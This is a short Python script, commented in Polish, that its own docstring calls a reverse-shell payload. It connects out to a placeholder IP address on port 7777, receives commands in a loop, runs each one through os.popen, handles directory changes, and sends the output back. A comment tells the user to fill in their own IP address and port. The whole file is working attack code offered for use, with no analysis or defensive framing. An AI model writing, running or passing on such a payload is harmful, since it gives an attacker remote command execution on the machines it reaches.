import socket
import os 
def main():
    """Payload służący do uzysknia połączenia z hostem za pomocą odwróconej powłki """
    #Ustaw adres swój adres IP i port 
    host = '000.000.0.00'
    port = 7777

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        while True:
            data = sock.recv(1024)
            if not data:
                break
            output = execute_command(data.decode())
            sock.sendall(output.encode())
        
        sock.close()
    except ConnectionRefusedError:
        print("Połączenie zostało odrzucone.")
    except Exception as e:
        print("Wystąpił błąd:", e)

def execute_command(command):
    try:
        output = ''
        if command.startswith('cd'):
            # Obsługa zmiany katalogu
            directory = command[3:].strip()
            try:
                os.chdir(directory)
            except FileNotFoundError:
                output = f"Nie można odnaleźć katalogu: {directory}"
        else:
            # Wykonanie komendy i przechwycenie wyniku
            output = os.popen(command).read()
        
        return output
    except Exception as e:
        return f"Wystąpił błąd: {e}"

if __name__ == "__main__":
    main()
